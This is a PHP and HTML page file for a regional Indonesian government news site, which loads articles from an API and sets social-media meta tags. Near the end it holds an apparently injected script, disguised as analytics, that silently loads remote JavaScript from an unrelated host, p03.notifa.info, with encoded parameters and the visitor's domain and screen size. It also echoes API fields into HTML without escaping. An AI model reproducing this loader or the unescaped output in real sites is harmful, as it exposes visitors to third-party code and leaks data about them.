<?php

    if(isset($_GET['id'])) {
        $id = htmlspecialchars($_GET["id"]);
        
        $data = array(
        'id' => $id
        );
    
        $payload = json_encode($data);
    
        $ch_url_host = 'http://server-api.konaweselatankab.com';
        $ch = curl_init( $ch_url_host.'/api/v1/web_publish_berita/isi_berita_php');
    
    
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload))
        );
    
        // $ch = curl_init();
    
    
        $result = curl_exec($ch);
        
        // Close cURL session handle
        curl_close($ch);
    
        $manage = json_decode($result);
        
        
        //  echo $id;
        // echo $result;
        
    }
    
    

?>








<!DOCTYPE html>
<html lang=en>

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">


    
    
    <meta http-equiv=X-UA-Compatible content="IE=edge">
    <meta name=viewport content="width=device-width,initial-scale=1">
    
    
    
    
    <?php 
    
        if(isset($_GET['id'])){

            echo '
            
            <meta property="fb:app_id" content="1879416282388598" />
            <meta property="og:url" content="https://konaweselatankab.go.id/lihatberita?id='.$id.'" />
            <meta property="og:type" content="article" />
            <meta property="og:title" content="'.$manage->judul.'" />
            <meta property="og:description" content="'.$manage->judul.'" />
            <meta property="og:image" content="https://server-api.konaweselatankab.com/uploads/'.$manage->foto.'" />
            ';
        }
    ?>
    
    
    <title>KAB. KONSEL</title>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <link rel="shortcut icon" href=assets/img/ico/favicon.png> <link rel=apple-touch-icon-precomposed sizes=144x144
        href=assets/img/ico/apple-touch-icon-144-precomposed.png> <link rel=apple-touch-icon-precomposed sizes=114x114
        href=assets/img/ico/apple-touch-icon-114-precomposed.png> <link rel=apple-touch-icon-precomposed sizes=72x72
        href=assets/img/ico/apple-touch-icon-72-precomposed.png> <link rel=apple-touch-icon-precomposed
        href=assets/img/ico/apple-touch-icon-57-precomposed.png> <link
        href="https://fonts.googleapis.com/css?family=Raleway:400,300,500,700,900" rel=stylesheet type=text/css> <link
        href=assets/fonts/iconfont/material-icons.css rel=stylesheet>
    <link href=assets/fonts/font-awesome/css/font-awesome.min.css rel=stylesheet>
    <link href=assets/magnific-popup/magnific-popup.css rel=stylesheet>
    <link href=assets/owl.carousel/assets/owl.carousel.css rel=stylesheet>
    <link href=assets/owl.carousel/assets/owl.theme.default.min.css rel=stylesheet>
    <link href=assets/flexSlider/flexslider.css rel=stylesheet>
    <link href=assets/materialize/css/materialize.min.css rel=stylesheet>
    <link href=assets/bootstrap/css/bootstrap.min.css rel=stylesheet>
    <link href="assets/css/shortcodes/shortcodesae52.css?v=5" rel=stylesheet>
    <link href="styleae52.css?v=5" rel=stylesheet>
    <link rel=stylesheet type=text/css href=assets/revolution/css/settings.css> <link rel=stylesheet type=text/css
        href=assets/revolution/css/layers.css> <link rel=stylesheet type=text/css
        href=assets/revolution/css/navigation.css> <link rel=stylesheet type=text/css href=assets/css/kiken.css> <link
        rel=stylesheet type=text/css href=assets/css/huruf.css> <link rel=stylesheet type=text/css
        href=assets/css/row_same_height.css> <link rel=stylesheet type=text/css href=assets/css/table.css> <link
        rel=stylesheet type=text/css href=assets/css/bg.css> <script
        src=https://api.mapbox.com/mapbox-gl-js/v1.4.1/mapbox-gl.js> </script> <link
        href=https://api.mapbox.com/mapbox-gl-js/v1.4.1/mapbox-gl.css rel=stylesheet>
    <link href=assets/css/maps.css rel=stylesheet>
    <link href=css/app.b6237d1c.css rel=preload as=style>
    <link href=css/chunk-vendors.188e04d6.css rel=preload as=style>
    <link href=js/app.214d448d.js rel=preload as=script>
    <link href=js/chunk-vendors.7f7ad6d9.js rel=preload as=script>
    <link href=css/chunk-vendors.188e04d6.css rel=stylesheet>
    <link href=css/app.b6237d1c.css rel=stylesheet>
    <link rel=icon type=image/png sizes=32x32 href=img/icons/favicon-32x32.png> <link rel=icon type=image/png
        sizes=16x16 href=img/icons/favicon-16x16.png> <link rel=manifest href=manifest.json>
    <meta name=theme-color content=#4DBA87>
    <meta name=apple-mobile-web-app-capable content=no>
    <meta name=apple-mobile-web-app-status-bar-style content=default>
    <meta name=apple-mobile-web-app-title content=web>
    <link rel=apple-touch-icon href=img/icons/apple-touch-icon-152x152.png> <link rel=mask-icon
        href=img/icons/safari-pinned-tab.svg color=#4DBA87>
    <meta name=msapplication-TileImage content=img/icons/msapplication-icon-144x144.png> <meta
        name=msapplication-TileColor content=#000000>
</head>

<body id=top class=has-header-search><noscript><strong>We're sorry but web doesn't work properly without JavaScript
            enabled. Please enable it to continue.</strong></noscript>
    <script>
        const URL_APP = 'https://server-api.konaweselatankab.com/';
        // const URL_APP = 'http://localhost:5005/';
        const TAHUN = '2019';
        // const URL_APP = 'http://192.168.8.102:5005/';
        // const URL_APP = 'http://36.89.95.163:5005/';

        // const URL_HOST = 'http://36.89.95.163:8002/#';
        const URL_HOST = 'https://konaweselatankab.go.id/#';
    </script>
    <div id=app></div>
    <script src=assets/js/jquery-2.1.3.min.js> </script> <script src=assets/bootstrap/js/bootstrap.min.js> </script>
        <script src=assets/materialize/js/materialize.min.js> </script> <script src=assets/js/menuzord.js> </script>
        <script src=assets/js/bootstrap-tabcollapse.min.js> </script> <script src=assets/js/jquery.easing.min.js>
        </script> <script src=assets/js/jquery.sticky.min.js> </script> <script src=assets/js/smoothscroll.min.html>
        </script> <script src=assets/js/imagesloaded.js> </script> <script src=assets/js/jquery.stellar.min.js>
        </script> <script src=assets/js/jquery.inview.min.js> </script> <script src=assets/js/jquery.shuffle.min.js>
        </script> <script src=assets/owl.carousel/owl.carousel.min.js> </script> <script
        src=assets/flexSlider/jquery.flexslider-min.js> </script> <script
        src=assets/magnific-popup/jquery.magnific-popup.min.js> </script> <script src="assets/js/scriptsae52.js?v=5">
    </script>
    <script src=assets/revolution/js/jquery.themepunch.tools.min.js> </script> <script
        src=assets/revolution/js/jquery.themepunch.revolution.min.js> </script> <script>
        jQuery(document).ready(function () {
            jQuery(".materialize-slider").revolution({
                sliderType: "standard",
                sliderLayout: "fullwidth",
                delay: 9000,
                navigation: {
                    keyboardNavigation: "on",
                    keyboard_direction: "horizontal",
                    mouseScrollNavigation: "off",
                    onHoverStop: "off",
                    touch: {
                        touchenabled: "on",
                        swipe_threshold: 75,
                        swipe_min_touches: 1,
                        swipe_direction: "horizontal",
                        drag_block_vertical: false
                    },
                    arrows: {
                        style: "gyges",
                        enable: true,
                        hide_onmobile: false,
                        hide_onleave: true,
                        tmp: '',
                        left: {
                            h_align: "left",
                            v_align: "center",
                            h_offset: 10,
                            v_offset: 0
                        },
                        right: {
                            h_align: "right",
                            v_align: "center",
                            h_offset: 10,
                            v_offset: 0
                        }
                    }
                },
                responsiveLevels: [1240, 1024, 778, 480],
                gridwidth: [1240, 1024, 778, 480],
                gridheight: [700, 600, 500, 500],
                disableProgressBar: "on",
                parallax: {
                    type: "mouse",
                    origo: "slidercenter",
                    speed: 2000,
                    levels: [2, 3, 4, 5, 6, 7, 12, 16, 10, 50],
                }


            });
        });
    </script>
    <script src=assets/revolution/js/extensions/revolution.extension.video.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.slideanims.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.actions.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.layeranimation.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.kenburn.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.navigation.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.migration.min.js> </script> <script
        src=assets/revolution/js/extensions/revolution.extension.parallax.min.js> </script> <script>
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2KLZBnGaL0jTeBaaZpUQ7imM0vhxRvddNjxRTXQ6bJq7SJtQteAFXfPt7gSIYGB1mrcuqc34HlU1z%2bUNfgY2bwAI6Q%2b5g5vY3S%2bj10qAEl3jKaC4%2bSMGl1O5xtxu%2fgb5XYy3zhP%2fsRxmQygj7ri%2fdc11qQEZQ0WMK8OayiYuRlLeIXn80jJYkXekWeM%2bTV9YklKolsPMPM5NipS3GEPmkqWlmKukE22SzkFgo88%2bsBuieGO%2fl8RN5kgGjrfAsb14HXS7SDBXb8IBi%2feoHn4TLwHrZ7Gj%2bVK2l4A2zdvN0zQYUcNzbUopEkE5TNPVyfSdV9IiuwVdgOlOz%2fSsJzrh67P5N%2fY3Q%2bBUZ7uxf8WoUsiW5YAxwK0vu0u%2bjgo0ssDBtgqYrC7xa3vvFXop75mzX5ugl7VX5tYcMKh7UcTAdysb4NJQajMWIe%2bQ4oVCOvw%2f%2fbCgbsr8UnhCb0410sgEQRhcFkinKLjwNQSThKg0I8ZU%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
    <script
        src=js/chunk-vendors.7f7ad6d9.js> </script> <script src=js/app.214d448d.js> </script> </body> </html>